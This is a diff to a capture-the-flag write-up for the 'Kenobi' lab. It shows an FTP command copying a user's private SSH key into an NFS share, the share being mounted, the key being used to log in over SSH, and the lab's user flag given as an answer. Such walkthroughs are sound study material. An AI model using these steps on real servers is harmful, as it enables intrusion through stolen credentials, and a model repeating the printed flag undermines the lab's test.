@@ -168,17 +168,57 @@ SITE CPFR /home/kenobi/.ssh/id_rsa
 SITE CPTO /var/tmp/id_rsa
 250 Copy successful
 ```
-4. Mount NFS as instruction
+4. Mount NFS as instructed
 ```bash
 root@system:/tmp# mkdir /mnt/kenobiNFS
 root@system:/tmp# mount 10.10.245.171:/var /mnt/kenobiNFS
-mount: /mnt/kenobiNFS: bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.<type> helper program.
 root@system:/tmp# ls -la /mnt/kenobiNFS
-total 8
-drwxr-xr-x 2 root root 4096 Feb 29 10:03 .
-drwxr-xr-x 3 root root 4096 Feb 29 10:03 ..
+total 56
+drwxr-xr-x 14 root root  4096 Sep  4  2019 .
+drwxr-xr-x  3 root root  4096 Feb 29 10:11 ..
+drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
+drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
+drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
+drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
+drwxrwsr-x  2 root staff 4096 Apr 13  2016 local
+lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
+drwxrwxr-x 10 root sgx   4096 Sep  4  2019 log
+drwxrwsr-x  2 root mail  4096 Feb 27  2019 mail
+drwxr-xr-x  2 root root  4096 Feb 27  2019 opt
+lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
+drwxr-xr-x  2 root root  4096 Jan 30  2019 snap
+drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
+drwxrwxrwt  6 root root  4096 Feb 29 10:00 tmp
+drwxr-xr-x  3 root root  4096 Sep  4  2019 www
+
 ```
-5. 
+5. Copy id_rsa to local system and connect to the server using ssh as instructed
+```bash
+root@system:/tmp# cp /mnt/kenobiNFS/tmp/id_rsa .
+root@system:/tmp# chmod 600 id_rsa 
+root@system:/tmp# ssh -i id_rsa kenobi@10.10.245.171
+The authenticity of host '10.10.245.171 (10.10.245.171)' can't be established.
+ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.245.171' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+103 packages can be updated.
+65 updates are security updates.
+
+
+Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+kenobi@kenobi:~$ 
+```
+6. Question `What is Kenobi's user flag (/home/kenobi/user.txt)?` Answer `d0b0f3f53b6caa532a83915e19224899` 32 alphanumeric characters. Get using `cat /home/kenobi/user.txt`
 ## Privilege Escalation with Path Variable Manipulation 
 
 Author: Zishan Ahamed Thandar
